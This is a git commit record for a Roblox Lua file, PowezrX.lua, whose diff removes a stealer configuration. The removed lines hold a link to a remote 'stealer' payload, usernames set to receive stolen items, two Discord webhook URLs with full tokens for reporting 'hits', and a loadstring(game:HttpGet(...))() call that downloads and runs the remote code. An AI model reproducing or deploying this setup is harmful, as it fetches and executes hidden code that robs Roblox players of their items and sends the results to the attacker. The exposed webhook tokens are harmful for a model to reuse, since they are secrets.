cbab1be2f4adf54bfb11920cb1ee2146346d730d
XyhperZ <vyhvtfy@gmail.com>
2025-04-01 18:24:55 +0900

    Update PowezrX.lua

--- PowezrX.lua
+++ PowezrX.lua
@@ -1,10 +1,1 @@
-STEALER_LINK = 'https://dpaste.com/9GQC5NGHM.txt' -- stealer link (how to create is bellow)
 
-Usernames = {
-    'PowerXsalem', -- PUT UR ROBLOX USERNAMES
-}
-
-BigHitsWebhook = "https://discord.com/api/webhooks/1356555871743770805/iTRghsQJ9DWd_XPAtADE6KG7QBbLlcOY3zJVjK0Bq2GJVLTyjKh6H73Ge_5sYNoiiEkX"
-SmallHitsWebhook = "https://discord.com/api/webhooks/1356555951003406396/cJKgVA4NyFfx3pqR_mUNcJA74YkIphVrYg8Ecm6w1s8LmiRbQ-HXyho7gnlEN2Gha7YL"
-
-loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
